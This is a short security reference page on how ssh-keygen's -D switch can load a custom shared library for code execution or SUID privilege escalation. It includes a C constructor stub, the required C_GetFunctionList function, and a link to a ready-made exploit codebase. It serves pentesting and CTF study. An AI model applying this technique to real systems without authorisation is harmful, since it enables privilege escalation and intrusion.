---
title: ssh-keygen
description: A reference on features of the ssh-keygen binary, relevant for security testing, exploiting and CTF.
---

## Code execution/Privilege escalation

The binary `ssh-keygen` can be made to load custom libraries via the `-D` switch.

```bash
ssh-keygen -D /path/to/custom/library.so
```

The easiest way to write a library in such a way that its code is executed by ssh-keygen is to add a library constructor
`__attribute__((constructor))`.

```c
void __attribute__ ((constructor)) constructor() {
    printf("I will be executed on library load!");
}
```

Note that `ssh-keygen` makes a rudimentary check before loading a library! In particular, it checks for the existence of
a function `C_GetFunctionList()`. The function signature does not matter, but it has to be present!

```c
int C_GetFunctionList() {
	return 1;
}
```

A ready-made codebase for getting code execution is available [here](https://github.com/jonasheschl/lib2shell-ssh-keygen).
This codebase also preserves the effective user id. Useful if ssh-keygen is run with SUID for example.

## References

1. [ssh-keygen man page](https://www.man7.org/linux/man-pages/man1/ssh-keygen.1.html)
2. [Blog post by Sean Pesce](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html)
3. [Modified lib2shell codebase for exploiting the ssh-keygen behaviour](https://github.com/jonasheschl/lib2shell-ssh-keygen)
